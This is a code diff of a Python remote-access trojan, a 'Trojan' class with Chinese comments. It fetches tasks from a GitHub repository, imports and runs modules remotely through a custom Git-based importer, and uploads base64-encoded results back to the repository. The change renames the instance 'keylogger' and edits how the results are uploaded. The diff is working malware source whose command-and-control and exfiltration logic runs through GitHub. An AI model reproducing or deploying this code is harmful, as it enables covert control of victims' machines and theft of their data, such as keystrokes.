@@ -49,7 +49,7 @@ class Trojan:
                 exec(f"import {task['module']}")
         return config
 
-    # 执行模块
+    # 执行模块/木马
     def module_runner(self, module):
         result = sys.modules[module].run()  # 执行模块中的run方法
         self.store_module_result(result)  # 存储模块执行结果
@@ -59,15 +59,9 @@ class Trojan:
         message = datetime.now().isoformat()  # 使用当前时间作为文件名
         remote_path = f'data/{self.id}/{message}.data'  # 生成远程路径
         bindata = bytes('%r' % data, 'utf-8')  # 将结果转换为字节
-        # self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
-
-        # 创建存储结果的文件夹（如果不存在）
-        if not self.repo.contents(f'data/{self.id}'):
-            self.repo.create_directory(f'data/{self.id}')
-
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub
 
-    # 运行木马
+    # 运行本程序
     def run(self):
         while True:
             config = self.get_config()  # 获取配置文件
@@ -105,5 +99,5 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())  # 添加自定义模块导入器
-    trojan = Trojan('TROJANID')  # 创建木马对象
+    trojan = Trojan('keylogger')  # 创建木马对象
     trojan.run()  # 运行木马
